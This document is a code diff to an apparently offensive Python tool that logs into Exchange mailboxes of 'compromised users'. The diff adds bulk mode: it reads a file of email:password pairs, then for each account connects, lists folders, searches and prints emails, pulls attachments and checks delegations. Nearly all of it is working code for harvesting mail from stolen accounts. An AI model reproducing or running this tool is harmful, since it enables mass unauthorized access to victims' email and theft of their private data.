@@ -54,13 +54,12 @@ def folderList(accountObject):
 
     folder = accountObject.root/'Top of Information Store'
 
-    print('[+] Folder List for Compromised Users' + '\n')
+    print('[+] Folder List' + '\n')
     for folders in folder.walk():
         print(folders.name)
 
 # Search users email for specified terms
 def searchEmail(accountObject, params, loghandle):
-
     folder = params.get("folder")
     terms = params.get("terms")
     count = params.get("count")
@@ -83,8 +82,9 @@ def searchEmail(accountObject, params, loghandle):
             '[+] Searching Email Subject for {} in {} Folder [+]'.format(terms, folder) + '\n')
         for term in termList:
             searchResult = searchFolder.filter(subject__contains=term)[:count]
-
+    
     for emails in searchResult:
+        print(emails)
         loghandle.debug('''
 From: {}
 Date: {}
@@ -181,6 +181,20 @@ def file_parser(params):
 
 	return return_dict
 
+def list_file_parser(params):
+	return_val = []
+
+	if isfile(params.get("list")):
+		with open (params.get("list","r")) as f:
+			userfile_content = f.read().splitlines()
+			f.close()
+			for line in userfile_content:
+				return_val.append({'email':line.split(":")[0],'password':line.split(":")[1],'server':params.get('server')})
+	else:
+		print ("File not found!")
+
+	return return_val    
+
 def print_logo():
 
     logo = '''
@@ -218,6 +232,8 @@ if __name__ == "__main__":
                                  dest="email", metavar=' ', help='Email address of compromised user')
     optional_parser.add_argument('-p', '--password', action="store",
                                  dest="password", metavar=' ', help='Password of compromised user')
+    optional_parser.add_argument('-l', '--list', action="store",
+                                 dest="list", metavar=' ', help='File with list of usernames and password combinations')
 
     folder_parser = subparsers.add_parser(
         'folders', help="List Mailbox Folders", parents=[optional_parser])
@@ -267,17 +283,35 @@ if __name__ == "__main__":
 
     if parsed_arguments.get("output"):
         loghandle = loggerCreate(parsed_arguments)
-    accountObj = acctSetup(parsed_arguments)
 
-    if accountObj is None:
-        print('[+] Could not connect to MailBox [+]')
-        sys.exit()
+    accountDetails = []
+
+    if parsed_arguments.get("list"):
+        accountDetails = list_file_parser(parsed_arguments)
+    else:
+        accountDetails.append(parsed_arguments)
+
+    for accountDetails in accountDetails:
+        parsed_arguments['email'] = accountDetails['email']
+        parsed_arguments['server'] = accountDetails['server']
+        parsed_arguments['password'] = accountDetails['password']
         
-    if parsed_arguments['modules'] == 'folders':
-        folderList(accountObj)
-    elif parsed_arguments['modules'] == 'emails':
-        searchEmail(accountObj, parsed_arguments, loghandle)
-    elif parsed_arguments['modules'] == 'attachment':
-        searchAttachments(accountObj, parsed_arguments)
-    elif parsed_arguments['modules'] == 'delegation':
-        searchDelegates(parsed_arguments,fileparser)
+        print(
+            '[+] Attemping to connect to Email {} [+]'.format(accountDetails.get("email")) + '\n')
+
+        accountObj = acctSetup(accountDetails)
+        if accountObj is None:
+            print('[+] Could not connect to MailBox [+]')
+            sys.exit()
+            
+        if parsed_arguments['modules'] == 'folders':
+            folderList(accountObj)
+        elif parsed_arguments['modules'] == 'emails':
+            loghandle.debug('''
+Emails for : {}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++{}'''.format(parsed_arguments.get('email'), '\n'))
+            searchEmail(accountObj, parsed_arguments, loghandle)
+        elif parsed_arguments['modules'] == 'attachment':
+            searchAttachments(accountObj, parsed_arguments)
+        elif parsed_arguments['modules'] == 'delegation':
+            searchDelegates(parsed_arguments,fileparser)
